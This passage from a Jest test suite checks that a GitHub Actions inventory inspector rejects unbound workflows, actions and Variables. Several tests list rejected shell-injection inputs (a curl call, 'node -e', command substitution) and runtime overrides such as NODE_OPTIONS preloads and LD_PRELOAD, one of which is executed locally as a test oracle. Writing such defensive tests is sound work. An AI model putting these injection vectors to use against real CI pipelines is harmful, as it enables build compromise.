        { id: 'data', path, kind: json ? 'data-file' : 'node-entrypoint', content: json ? '{"enabled":true}\n' : "require('./main.js');\n" }],
      edges: [{ from: 'workflow-ci', to: 'action', role: 'uses:inspect:1' }, { from: 'action', to: 'main', role: 'main' },
        { from: 'main', to: 'data', role: 'import:1' }, ...(json ? [] : [{ from: 'data', to: 'main', role: 'import:1' }])] });
    if (scenario === 'valid JSON') await expect(f.inspect()).resolves.toMatchObject({ approvals: [{ actorId: 17 }] });
    else { await expect(f.inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' }); expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false); }
  });
it.each(['$GITHUB_ACTION_PATH', '${{ github.action_path }}'])(
  'publisher-inventory-C27: a composite %s shell callee remains source-bound through recursion and literal operators', async actionPath => {
    const action = `runs:\n  using: composite\n  steps:\n    - run: bash "${actionPath}/helper.sh"\n      shell: bash\n`;
    const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    steps:\n      - uses: owner/project/action@${'1'.repeat(40)}\n`,
      programs: [{ id: 'action', path: 'action/action.yml', kind: 'composite-action', content: action },
        { id: 'inline', path: 'action/action.yml', kind: 'shell-program', content: action },
        { id: 'helper', path: 'action/helper.sh', kind: 'shell-program', content: 'printf ok && echo done || false; : # controlled comment\n' }],
      edges: [{ from: 'workflow-ci', to: 'action', role: 'uses:inspect:1' },
        { from: 'action', to: 'inline', role: 'run:composite:1' }, { from: 'inline', to: 'helper', role: 'program:1' }] });
    await expect(f.inspectComplete()).resolves.toMatchObject({ inspection: { installation: { inventoryReview: { approvals: [{ actorId: 17 }] } } } });
    f.document.edges = f.document.edges.filter(edge => edge.role !== 'program:1'); f.seal();
    await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'unresolved-closure' });
    expect(f.request.mock.calls.every(([r]) => r.startsWith('GET '))).toBe(true);
  });
it.each([
  ['unknown command', 'curl controlled.invalid'], ['interpreter flag', 'node -e "void 0"'],
  ['unsafe program path', 'node /outside/program.js'], ['unbound workspace', 'node ./program.js'],
  ['unknown environment', 'printf "$UNBOUND"'], ['parameter substitution', 'printf "${MODE:-value}"'],
  ['command substitution', 'printf "$(echo value)"'], ['backtick command', 'printf "`echo value`"'],
  ['line continuation', 'printf \\\nvalue'], ['unresolved shell expression', 'printf "${{ env.MODE }}"'],
])('publisher-inventory-C49: shell execution rejects %s without reaching review authority', async (_name, command) => {
  const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    steps:\n      - run: ${JSON.stringify(command)}\n` });
  await expect(f.inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
  expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
});
it.each(['PATH', 'NODE_OPTIONS', 'BASH_ENV', 'LD_PRELOAD', 'DYLD_INSERT_LIBRARIES'])(
  'publisher-inventory-C49: shell runtime override %s prevents a false source-closure claim', async name => {
    const f = fixture({ workflow: `on: push\nenv: ${JSON.stringify({ [name]: 'controlled' })}\njobs:\n  inspect:\n    steps:\n      - run: printf ok\n` });
    // The input fingerprint is deliberately absent: a runtime override must
    // stop before a seemingly self-consistent input document could authorize it.
    await expect(f.inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
    expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
  });
it('publisher-inventory-C30: a Node runtime preload outside the reviewed Git graph cannot become compatible inventory', async () => {
  const directory = await mkdtemp(join(tmpdir(), 'publisher-node-preload-'));
  try {
    const preload = join(directory, 'unbound-preload.cjs'), entry = join(directory, 'reviewed-entry.cjs');
    await writeFile(preload, 'process.stdout.write("controlled-preload:");\n');
    const program = 'process.stdout.write("reviewed-entry");\n'; await writeFile(entry, program);
    const options = `--require ${JSON.stringify(preload)}`;
    // The actual local interpreter runs this authored preload before the exact
    // authored entrypoint. This is a controlled oracle, not inspection execution.
    expect(execFileSync(process.execPath, [entry], { cwd: directory, encoding: 'utf8',
      env: { NODE_OPTIONS: options, ...(process.env.SystemRoot ? { SystemRoot: process.env.SystemRoot } : {}) } }))
      .toBe('controlled-preload:reviewed-entry');
    const f = nodeAction(program, undefined, `env: ${JSON.stringify({ NODE_OPTIONS: options })}\n`);
    const unit = f.document.units.find(u => u.id === 'workflow-ci')!;
    const anchor = { workflow: workflowPath, job: '', step: 0, input: 'env:NODE_OPTIONS', origin: 'workflow-env' as const };
    f.document.inputs.push({ id: publisherInventorySha256(anchor), ...anchor, sourceFingerprint: publisherInventorySha256({
      kind: 'publisher-inventory-input-source', source: { repositoryId: unit.repositoryId, commit: unit.commit,
        path: unit.path, contentSha256: unit.contentSha256 }, definition: options,
      effectiveEnvironment: { NODE_OPTIONS: options }, callerInputs: {}, variables: {} }) }); f.seal();
    await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'unresolved-closure' });
    expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
  } finally { await rm(directory, { recursive: true, force: true }); }
});
it('publisher-inventory-C30: a nested literal Action default binds the effective caller input at its actual execution anchor', async () => {
  const definition = '${{ inputs.mode }}';
  const outer = `inputs:\n  mode:\n    default: controlled-default\nruns:\n  using: composite\n  steps:\n    - uses: owner/project/inner@${'1'.repeat(40)}\n      with:\n        mode: ${definition}\n`;
  const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    steps:\n      - uses: owner/project/outer@${'1'.repeat(40)}\n`,
    programs: [{ id: 'outer', path: 'outer/action.yml', kind: 'composite-action', content: outer },
      { id: 'inner', path: 'inner/action.yml', kind: 'action', content: 'runs: {using: node24, main: main.js}\n' },
      { id: 'main', path: 'inner/main.js', kind: 'node-entrypoint', content: 'module.exports = process.env.INPUT_MODE;\n' }],
    edges: [{ from: 'workflow-ci', to: 'outer', role: 'uses:inspect:1' }, { from: 'outer', to: 'inner', role: 'uses:composite:1' },
      { from: 'inner', to: 'main', role: 'main' }] });
  const unit = f.document.units.find(u => u.id === 'outer')!;
  for (const record of [{ job: 'inspect', step: 1, origin: 'default' as const, definition: 'controlled-default', callerInputs: {} },
    { job: `${hash('/workflow-ci/uses:inspect:1').slice(0, 32)}:composite`, step: 1, origin: 'literal' as const, definition,
      callerInputs: { mode: 'controlled-default' } }]) {
    const anchor = { workflow: workflowPath, job: record.job, step: record.step, input: 'with:mode', origin: record.origin };
    f.document.inputs.push({ id: publisherInventorySha256(anchor), ...anchor, sourceFingerprint: publisherInventorySha256({
      kind: 'publisher-inventory-input-source', source: { repositoryId: unit.repositoryId, commit: unit.commit,
        path: unit.path, contentSha256: unit.contentSha256 }, definition: record.definition,
      effectiveEnvironment: {}, callerInputs: record.callerInputs, variables: {} }) });
  }
  f.seal(); await expect(f.inspectComplete()).resolves.toMatchObject({ inspection: { installation: { inventoryReview: { approvals: [{ actorId: 17 }] } } } });
  f.document.inputs[1].sourceFingerprint = '0'.repeat(64); f.seal();
  await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'binding-mismatch' });
});
it('publisher-inventory-C02: the independent adapter itself cannot promote a legacy proposal into review authority', async () => {
  const f = fixture(), legacy = setupPublisherFixture().proposal;
  await expect(new SetupPublisherInventoryReviewAdapter(f.transport).inspect(legacy, f.observed, 'controlled-fixture'))
    .rejects.toMatchObject({ reason: 'review-required' });
  expect(f.request).not.toHaveBeenCalled();
});
it.each(['absent document', 'noncanonical document mode', 'digest changed', 'permission unavailable'] as const)(
  'publisher-inventory-C50: selected evidence cannot grant authority after %s', async fault => {
    const f = fixture(), original = f.request.getMockImplementation()!;
    if (fault === 'absent document') f.commits.set(head, f.commits.get(evidenceBase)!);
    if (fault === 'digest changed') f.locator.documentSha256 = '0'.repeat(64);
    f.request.mockImplementation(async (route, p) => {
      if (fault === 'permission unavailable' && route.endsWith('/permission')) throw { status: 403 };
      const result = await original(route, p);
      if (fault === 'noncanonical document mode' && route.endsWith('/git/trees/{tree_sha}')) {
        const tree = result.data as { tree: { path: string }[] };
        return { data: { ...tree, tree: tree.tree.map(entry => entry.path === 'bugbot-publisher-inventory-review.json'
          ? { ...entry, mode: '100755' } : entry) } };
      }
      return result;
    });
    await expect(f.inspect()).rejects.toMatchObject({ reason: fault === 'digest changed' ? 'binding-mismatch' : 'review-unavailable' });
    expect(f.request.mock.calls.every(([r]) => r.startsWith('GET '))).toBe(true);
  });

it('publisher-inventory-C13: rejects another repository evidence head before reading its document', async () => {
  const f = fixture(); (f.pull.head as { repo: { id: number } }).repo.id = 999;
  await expect(f.inspect()).rejects.toMatchObject({ reason: 'review-unavailable' });
  expect(f.request).toHaveBeenCalledTimes(1);
});
it('publisher-inventory-C19: reads decisive reviews after page one and rejects exhausted pagination', async () => {
  const f = fixture(), pending = (id: number) => ({ id, user: { id: 18, login: 'pending-reviewer', type: 'User' }, state: 'PENDING',
    submitted_at: null, commit_id: null, body: null });
  f.setReviews([...Array.from({ length: 100 }, (_, i) => pending(i + 1)), { id: 101, user: { id: 17, login: 'reviewer', type: 'User' },
    state: 'APPROVED', submitted_at: '2026-11-28T00:00:00Z', commit_id: head, body: marker(f.document) }]);
  await expect(f.inspect()).resolves.toMatchObject({ approvals: [{ reviewId: 101, actorId: 17 }] });
  expect(f.request.mock.calls.filter(([r]) => r.endsWith('/reviews')).map(([, p]) => p.page)).toEqual([1, 2]);
  f.request.mockClear(); f.setReviews(Array.from({ length: 1000 }, (_, i) => pending(i + 1)));
  await expect(f.inspect()).rejects.toMatchObject({ reason: 'review-unavailable' });
  expect(f.request.mock.calls.filter(([r]) => r.endsWith('/reviews'))).toHaveLength(10);
  expect(f.request.mock.calls.some(([r]) => r.endsWith('/permission'))).toBe(false);
});
it('publisher-inventory-C23: authenticates actual complete Git source and an independent purpose-bound review', async () => {
  const f = fixture(), fact = await f.inspect();
  expect(fact).toMatchObject({ ...f.locator, base: evidenceBase, workflowSetSha256: f.document.workflowSetSha256,
    workflows: [{ path: workflowPath, disposition: 'non-producer' }], approvals: [{ reviewId: 101, actorId: 17, actorLogin: 'reviewer' }] });
  expect(fact.base).not.toBe(f.document.destination.head);
  expect(f.request.mock.calls.every(([route]) => route.startsWith('GET '))).toBe(true);
  expect(JSON.stringify(fact)).not.toContain('private-inventory-fixture');
  expect(Object.isFrozen(fact)).toBe(true);
});
it('publisher-inventory-C24: a missing workflow prevents a partial evidence document from establishing authority', async () => {
  const f = fixture(); f.document.workflows = []; f.document.workflowSetSha256 = publisherInventoryWorkflowSetSha256([]); f.seal();
  await expect(f.inspect()).rejects.toMatchObject({ reason: 'binding-mismatch' });
  expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
});
it('publisher-inventory-C25: an added observed workflow invalidates the former complete inventory', async () => {
  const f = fixture(); f.observed.workflows.push({ path: '.github/workflows/new.yml', mode: '100644', content: 'jobs: {}\n' });
  await expect(f.inspect()).rejects.toMatchObject({ reason: 'binding-mismatch' });
});
it('publisher-inventory-C26: changed workflow mode and bytes both invalidate the source-bound document', async () => {
  for (const change of [{ mode: '100755' }, { content: 'jobs: {}\n' }]) {
    const f = fixture(); Object.assign(f.observed.workflows[0], change);
    await expect(f.inspect()).rejects.toMatchObject({ reason: 'binding-mismatch' });
  }
});
it('publisher-inventory-C27: a transitive action cannot disappear behind a reviewed workflow hash', async () => {
  const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    steps:\n      - uses: owner/action@${'a'.repeat(40)}\n` });
  await expect(f.inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
  expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
});
it('publisher-inventory-C27: actual complete reader binds a pinned external reusable workflow and its inline program', async () => {
  const commit = 'a'.repeat(40), path = '.github/workflows/reusable.yml';
  const reusable = 'on:\n  workflow_call: {}\njobs:\n  child:\n    steps:\n      - run: printf ok\n';
  const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    uses: owner/reuse/${path}@${commit}\n`,
    programs: [{ id: 'reusable', path, kind: 'reusable-workflow', content: reusable },
      { id: 'reusable-shell', path, kind: 'shell-program', content: reusable }],
    edges: [{ from: 'workflow-ci', to: 'reusable', role: 'uses:inspect' },
      { from: 'reusable', to: 'reusable-shell', role: 'run:child:1' }] });
  // Keep external workflow bytes out of the destination's complete workflow
  // set. Both repositories are authenticated independently by the real reader.
  f.files.delete(path);
  const targetTree = f.retain(f.files), externalTree = f.retain(new Map([[path, reusable]]));
  f.commits.set(f.proposal.destination.head, targetTree); f.commits.set(commit, externalTree);
  f.document.destination.tree = f.observed.tree = targetTree;
  for (const unit of f.document.units) {
    if (!unit.id.startsWith('reusable')) unit.tree = targetTree;
    else Object.assign(unit, { repository: 'owner/reuse', repositoryId: 71, commit, tree: externalTree });
  }
  f.seal(); const original = f.request.getMockImplementation()!;
  f.request.mockImplementation(async (route, parameters) => {
    if (parameters.owner !== 'owner' || parameters.repo !== 'reuse') return original(route, parameters);
    if (route === 'GET /repos/{owner}/{repo}') return { data: { id: 71, full_name: 'owner/reuse' } };
    return original(route, { ...parameters, repo: 'project' });
  });
  const snapshot = await f.inspectComplete();
  expect(snapshot.inspection.installation.publisher).toEqual({ kind: 'absent', paths: [] });
  expect(planSetupPublisherInstallation(f.proposal, snapshot.inspection, '11111111-1111-4111-8111-111111111111').status).toBe('review');
  expect(f.request.mock.calls.some(([route, p]) => p.repo === 'reuse' && route.endsWith('/git/blobs/{file_sha}'))).toBe(true);
  f.document.edges = f.document.edges.filter(edge => edge.from !== 'reusable'); f.seal();
  await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'unresolved-closure' });
  expect(f.request.mock.calls.every(([r]) => r.startsWith('GET '))).toBe(true);
});
it('publisher-inventory-C28: missing pre and post bindings reject a main-only JS action inventory', async () => {
  for (const role of ['pre', 'post']) {
    const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    steps:\n      - uses: owner/project/action@${'1'.repeat(40)}\n`,
      programs: [{ id: 'action', path: 'action/action.yml', kind: 'action', content: `name: Fixture\nruns:\n  using: node24\n  main: main.js\n  ${role}: ${role}.js\n` },
        { id: 'main', path: 'action/main.js', kind: 'node-entrypoint', content: 'console.log("main");\n' }],
      edges: [{ from: 'workflow-ci', to: 'action', role: 'uses:inspect:1' }, { from: 'action', to: 'main', role: 'main' }] });
    await expect(f.inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
  }
});
it('publisher-inventory-C29: an actual checkout call without a literal immutable ref cannot authorize local execution', async () => {
  for (const ref of ['', '        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n']) {
    const action = 'name: Checkout fixture\nruns:\n  using: node24\n  main: main.js\n';
    const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    steps:\n      - uses: actions/checkout@${'1'.repeat(40)}\n${ref}      - uses: ./action\n`,
      programs: [{ id: 'checkout', path: 'action.yml', kind: 'action', content: action },
        { id: 'checkout-main', path: 'main.js', kind: 'node-entrypoint', content: 'console.log("fixture only");\n' }],
      edges: [{ from: 'workflow-ci', to: 'checkout', role: 'uses:inspect:1' }, { from: 'checkout', to: 'checkout-main', role: 'main' }] });
    for (const unit of f.document.units.filter(u => u.id.startsWith('checkout'))) { unit.repository = 'actions/checkout'; unit.repositoryId = 71; }
    f.seal(); const original = f.request.getMockImplementation()!;
    f.request.mockImplementation(async (route, p) => {
      if (p.owner !== 'actions' || p.repo !== 'checkout') return original(route, p);
      if (route === 'GET /repos/{owner}/{repo}') return { data: { id: 71, full_name: 'actions/checkout' } };
      return original(route, { ...p, owner: 'owner', repo: 'project' });
    });
    await expect(f.inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
    expect(f.request.mock.calls.some(([r, p]) => r.endsWith('/git/blobs/{file_sha}') && p.owner === 'actions')).toBe(true);
    expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
  }
});
it.each(['root action', 'action', 'reusable workflow'] as const)(
  'publisher-inventory-C29: documented dollar-slash %s binds the containing source without checkout', async kind => {
    const action = kind !== 'reusable workflow', path = kind === 'root action' ? 'action.yml'
      : action ? 'action/action.yml' : '.github/workflows/reusable.yml';
    const content = action ? 'name: Fixture\nruns:\n  using: composite\n  steps:\n    - run: printf reviewed\n      shell: bash\n'
      : 'on:\n  workflow_call: {}\njobs:\n  child:\n    steps:\n      - run: printf reviewed\n';
    const f = fixture({ workflow: action ? `on: push\njobs:\n  inspect:\n    steps:\n      - uses: ${kind === 'root action' ? '$/' : '$/action'}\n`
      : `on: push\njobs:\n  inspect:\n    uses: $/${path}\n`,
    programs: [{ id: 'called', path, kind: action ? 'composite-action' : 'reusable-workflow', content },
      { id: 'called-shell', path, kind: 'shell-program', content }],
    edges: [{ from: 'workflow-ci', to: 'called', role: action ? 'uses:inspect:1' : 'uses:inspect' },
      { from: 'called', to: 'called-shell', role: action ? 'run:composite:1' : 'run:child:1' }] });
    if (!action) {
      f.document.workflows.push({ path, mode: '100644', blob: blob(content), contentSha256: hash(content),
        entryUnits: ['workflow-reusable'], disposition: 'non-producer' });
      f.document.units.push({ ...f.document.units.find(unit => unit.id === 'called')!, id: 'workflow-reusable', kind: 'workflow' });
      f.document.edges.push({ from: 'workflow-reusable', to: 'called-shell', role: 'run:child:1' });
      f.document.workflowSetSha256 = publisherInventoryWorkflowSetSha256(f.document.workflows);
      f.seal();
    }
    const snapshot = await f.inspectComplete();
    expect(planSetupPublisherInstallation(f.proposal, snapshot.inspection, '11111111-1111-4111-8111-111111111111').status).toBe('review');
    expect(f.request.mock.calls.every(([route]) => route.startsWith('GET '))).toBe(true);
  });
it('publisher-inventory-C29: nested dollar-slash uses the external containing repository and commit', async () => {
  const commit = 'a'.repeat(40), path = '.github/workflows/reusable.yml', actionPath = 'action/action.yml';
  const reusable = 'on:\n  workflow_call: {}\njobs:\n  child:\n    steps:\n      - uses: $/action\n';
  const action = 'name: Fixture\nruns:\n  using: composite\n  steps:\n    - run: printf reviewed\n      shell: bash\n';
  const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    uses: owner/reuse/${path}@${commit}\n`,
    programs: [{ id: 'reusable', path, kind: 'reusable-workflow', content: reusable },
      { id: 'action', path: actionPath, kind: 'composite-action', content: action },
      { id: 'action-shell', path: actionPath, kind: 'shell-program', content: action }],
    edges: [{ from: 'workflow-ci', to: 'reusable', role: 'uses:inspect' },
      { from: 'reusable', to: 'action', role: 'uses:child:1' },
      { from: 'action', to: 'action-shell', role: 'run:composite:1' }] });
  f.files.delete(path);
  const targetTree = f.retain(f.files), externalTree = f.retain(new Map([[path, reusable], [actionPath, action]]));
  f.commits.set(f.proposal.destination.head, targetTree); f.commits.set(commit, externalTree);
  f.document.destination.tree = f.observed.tree = targetTree;
  for (const unit of f.document.units) {
    if (unit.id === 'workflow-ci') unit.tree = targetTree;
    else Object.assign(unit, { repository: 'owner/reuse', repositoryId: 71, commit, tree: externalTree });
  }
  f.seal(); const original = f.request.getMockImplementation()!;
  f.request.mockImplementation(async (route, parameters) => {
    if (parameters.owner !== 'owner' || parameters.repo !== 'reuse') return original(route, parameters);
    if (route === 'GET /repos/{owner}/{repo}') return { data: { id: 71, full_name: 'owner/reuse' } };
    return original(route, { ...parameters, repo: 'project' });
  });
  const snapshot = await f.inspectComplete();
  expect(planSetupPublisherInstallation(f.proposal, snapshot.inspection, '11111111-1111-4111-8111-111111111111').status).toBe('review');
  // Identical bytes really exist in the destination, but they are not the
  // action selected by the external reusable workflow's self reference.
  for (const unit of f.document.units.filter(u => u.id.startsWith('action'))) Object.assign(unit,
    { repository: 'owner/project', repositoryId: f.observed.target.id, commit: f.proposal.destination.head, tree: targetTree });
  f.seal(); await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'binding-mismatch' });
  const differentCommit = 'b'.repeat(40); f.commits.set(differentCommit, externalTree);
  for (const unit of f.document.units.filter(u => u.id.startsWith('action'))) Object.assign(unit,
    { repository: 'owner/reuse', repositoryId: 71, commit: differentCommit, tree: externalTree });
  f.seal(); await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'binding-mismatch' });
  expect(f.request.mock.calls.every(([route]) => route.startsWith('GET '))).toBe(true);
});
it.each(['$/action@main', `$/action@${'1'.repeat(40)}`, '$/../action'])(
  'publisher-inventory-C29: invalid dollar-slash source reference is rejected: %s', async reference => {
  const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    steps:\n      - uses: ${reference}\n`,
    programs: [{ id: 'action', path: 'action/action.yml', kind: 'composite-action',
      content: 'name: Fixture\nruns:\n  using: composite\n  steps: []\n' }],
    edges: [{ from: 'workflow-ci', to: 'action', role: 'uses:inspect:1' }] });
  await expect(f.inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
  expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
  });
it('publisher-inventory-C30: unavailable Variables stay unresolved before any independent approval is considered', async () => {
  const f = fixture({ workflow: 'on: push\nenv:\n  SELECTOR: ${{ vars.SELECTOR }}\njobs:\n  inspect:\n    steps: []\n' });
  await expect(f.inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
  expect(f.request.mock.calls.some(([r]) => r.endsWith('/actions/variables'))).toBe(true);
  expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
});
it('publisher-inventory-C30: complete later pages and selected-repository membership determine effective Variable provenance', async () => {
  const organization = [{ name: 'MODE', value: 'controlled-organization', visibility: 'selected' },
    { name: 'EXCLUDED', value: 'controlled-outside-selection', visibility: 'selected' }];
  const repository = Array.from({ length: 31 }, (_, n) => ({ name: `LOCAL_${n}`, value: `controlled-local-${n}` }));
  const expected: Record<string, { origin: 'repository-variable' | 'organization-variable'; value: string }> = {
    MODE: { origin: 'organization-variable', value: 'controlled-organization' },
    ...Object.fromEntries(repository.map(v => [v.name, { origin: 'repository-variable' as const, value: v.value }])),
  };
  const f = variableFixture({ organization, repository, expected, memberships: {
    MODE: [...Array.from({ length: 30 }, (_, n) => ({ id: n + 100 })), { id: 42 }], EXCLUDED: [{ id: 999 }],
  } });
  await expect(f.inspectComplete()).resolves.toMatchObject({ inspection: { installation: { inventoryReview: { approvals: [{ actorId: 17 }] } } } });
  expect(f.request.mock.calls.filter(([r]) => r === 'GET /repos/{owner}/{repo}/actions/variables').map(([, p]) => p.page)).toEqual([1, 2]);
  expect(f.request.mock.calls.filter(([r, p]) => r.endsWith('/repositories') && p.name === 'MODE').map(([, p]) => p.page)).toEqual([1, 2]);
  expect(JSON.stringify(f.document)).not.toContain('controlled-organization');
  expect(JSON.stringify(f.document)).not.toContain('controlled-local-30');
  expect(f.request.mock.calls.every(([r]) => r.startsWith('GET ') && !r.includes('/secrets'))).toBe(true);
});
it.each([
  { name: 'all organization repositories', visibility: 'all', public: true, included: true },
  { name: 'private repository', visibility: 'private', public: false, included: true },
  { name: 'public repository excluded from private scope', visibility: 'private', public: true, included: false },
])('publisher-inventory-C30: Variable visibility, $name', async row => {
  const f = variableFixture({ public: row.public, organization: [{ name: 'MODE', value: 'controlled-visibility', visibility: row.visibility }],
    expected: row.included ? { MODE: { origin: 'organization-variable', value: 'controlled-visibility' } } : {} });
  await expect(f.inspectComplete()).resolves.toMatchObject({ inspection: { installation: { publisher: { kind: 'absent' } } } });
});
it('publisher-inventory-C30: a user-owned repository reads its complete local Variables without organization authority', async () => {
  const f = variableFixture({ ownerType: 'User', repository: [{ name: 'mode', value: 'controlled-user' }],
    expected: { MODE: { origin: 'repository-variable', value: 'controlled-user' } } });
  await expect(f.inspectComplete()).resolves.toMatchObject({ inspection: { installation: { inventoryReview: { approvals: [{ actorId: 17 }] } } } });
  expect(f.request.mock.calls.some(([r]) => r.startsWith('GET /orgs/'))).toBe(false);
});
it.each([
  { name: 'non-object Variable', organization: [null] },
  { name: 'missing Variable name', organization: [{ value: 'controlled', visibility: 'all' }] },
  { name: 'unknown visibility', organization: [{ name: 'MODE', value: 'controlled', visibility: 'future' }] },
  { name: 'duplicate folded organization name', organization: [{ name: 'MODE', value: 'controlled', visibility: 'all' }, { name: 'mode', value: 'other', visibility: 'all' }] },
  { name: 'unsafe Variable name', repository: [{ name: 'invalid/name', value: 'controlled' }] },
  { name: 'non-string value', repository: [{ name: 'MODE', value: 7 }] },
  { name: 'oversized value', repository: [{ name: 'MODE', value: 'x'.repeat(30_001) }] },
  { name: 'duplicate folded repository name', repository: [{ name: 'MODE', value: 'controlled' }, { name: 'mode', value: 'other' }] },
  { name: 'non-object repository Variable', repository: [null] },
  { name: 'unsupported owner category', ownerType: 'Enterprise' },
  { name: 'malformed selected repository ID', organization: [{ name: 'MODE', value: 'controlled', visibility: 'selected' }], memberships: { MODE: [{ id: 0 }] } },
  { name: 'duplicate selected repository IDs', organization: [{ name: 'MODE', value: 'controlled', visibility: 'selected' }], memberships: { MODE: [{ id: 42 }, { id: 42 }] } },
  { name: 'aggregate Variable value limit', repository: Array.from({ length: 9 }, (_, n) => ({ name: `MODE_${n}`, value: 'x'.repeat(30_000) })) },
])('publisher-inventory-C30: malformed Variable facts remain unresolved: $name', async row => {
  const f = variableFixture(row);
  await expect(f.inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
  expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
  expect(f.request.mock.calls.every(([r]) => r.startsWith('GET '))).toBe(true);
});
it.each(['denied', 'missing total', 'over limit total', 'non-array', 'overfull page', 'short incomplete page', 'excess results', 'changed total'] as const)(
  'publisher-inventory-C30: incomplete Variable pagination never becomes absence: %s', async fault => {
    const variables = Array.from({ length: 31 }, (_, n) => ({ name: `MODE_${n}`, value: `controlled-${n}` }));
    const f = variableFixture({ repository: variables, response: (route, p, data) => {
      if (route !== 'GET /repos/{owner}/{repo}/actions/variables') return data;
      if (fault === 'denied') throw { status: 403 };
      const page = data as { total_count: number; variables: unknown[] };
      if (fault === 'missing total') return { variables: page.variables };
      if (fault === 'over limit total') return { ...page, total_count: 1001 };
      if (fault === 'non-array') return { total_count: 31, variables: {} };
      if (fault === 'overfull page') return { total_count: 31, variables };
      if (fault === 'short incomplete page') return { total_count: 31, variables: page.variables.slice(0, 1) };
      if (fault === 'excess results') return { ...page, total_count: 0 };
      return p.page === 1 ? page : { ...page, total_count: 32 };
    } });
    await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'unresolved-closure' });
    expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
  });
it.each(['repository-variable', 'organization-variable'] as const)(
  'publisher-inventory-C30: a direct Variable input retains its effective %s provenance', async origin => {
    const definition = '${{ vars.MODE }}', workflow = `on: push\nenv:\n  MODE: ${definition}\njobs:\n  inspect:\n    steps: []\n`;
    const f = fixture({ workflow }), source = f.document.units.find(u => u.id === 'workflow-ci')!;
    const variables = { MODE: { origin, value: origin === 'repository-variable' ? 'repository-mode' : 'organization-mode' } };
    const anchor = { workflow: workflowPath, job: '', step: 0, input: 'env:MODE', origin };
    f.document.inputs.push({ id: publisherInventorySha256(anchor), ...anchor, sourceFingerprint: publisherInventorySha256({
      kind: 'publisher-inventory-input-source', source: { repositoryId: source.repositoryId, commit: source.commit,
        path: source.path, contentSha256: source.contentSha256 }, definition, effectiveEnvironment: { MODE: definition }, callerInputs: {},
      variables: { effectiveVariablesSha256: publisherInventorySha256(variables) } }) });
    bindVariableContext(f, variables);
    const original = f.request.getMockImplementation()!;
    f.request.mockImplementation(async (route, parameters) => {
      if (route === 'GET /orgs/{org}/actions/variables') return { data: { total_count: 1,
        variables: [{ name: 'mode', value: 'organization-mode', visibility: 'private' }] } };
      if (route === 'GET /repos/{owner}/{repo}/actions/variables') return { data: { total_count: origin === 'repository-variable' ? 1 : 0,
        variables: origin === 'repository-variable' ? [{ name: 'MODE', value: 'repository-mode' }] : [] } };
      return original(route, parameters);
    });
    await expect(f.inspect()).resolves.toMatchObject({ approvals: [{ actorId: 17 }] });
    expect(JSON.stringify(f.document)).not.toContain(variables.MODE.value);
    expect(f.request.mock.calls.every(([route]) => route.startsWith('GET '))).toBe(true);
  });
it.each([
  { name: 'repository JSON overrides organization, env and with', repository: 'repository', organization: 'organization', env: true, provided: true, expected: 'repository' },
  { name: 'organization JSON overrides env and with', organization: 'organization', env: true, provided: true, expected: 'organization' },
  { name: 'step env overrides job, workflow and with', env: true, provided: true, expected: 'step' },
  { name: 'explicit with overrides manifest default', env: false, provided: true, expected: 'provided' },
  { name: 'manifest default is retained when with is absent', env: false, provided: false, expected: 'manifest-default' },
  { name: 'provided input name is case-insensitive', env: false, provided: true, inputName: 'MODE', expected: 'provided' },
])('publisher-inventory-C30: bound Action precedence, $name', async configuration => {
  const manifest = 'name: Fixture\ninputs:\n  mode:\n    default: manifest-default\n  token:\n    description: Credential unused by this controlled program\nruns:\n  using: node24\n  main: main.js\n';
  // Only this authored controlled program is executed as an independent test
  // oracle. The production inspector never executes repository programs.
  const program = "const values = JSON.parse(process.env.INPUT_VARS_JSON || '{}');\n"
    + "module.exports = values.MODE || process.env.MODE || process.env.INPUT_MODE || 'fallback';\n";
  // Even the fallback path must not inherit an unreviewed runner MODE.
  const rootEnv = { INPUT_VARS_JSON: '${{ toJSON(vars) }}', MODE: configuration.env ? 'workflow' : '' };
  const jobEnv = configuration.env ? { MODE: 'job' } : {}, stepEnv = configuration.env ? { MODE: 'step' } : {};
  const provided = { ...(configuration.provided ? { [configuration.inputName ?? 'mode']: 'provided' } : {}), token: '${{ secrets.PAT }}' };
  const workflow = `on: push\nenv: ${JSON.stringify(rootEnv)}\njobs:\n  inspect:\n    env: ${JSON.stringify(jobEnv)}\n    steps:\n`
    + `      - uses: owner/project/action@${'1'.repeat(40)}\n        env: ${JSON.stringify(stepEnv)}\n        with: ${JSON.stringify(provided)}\n`;
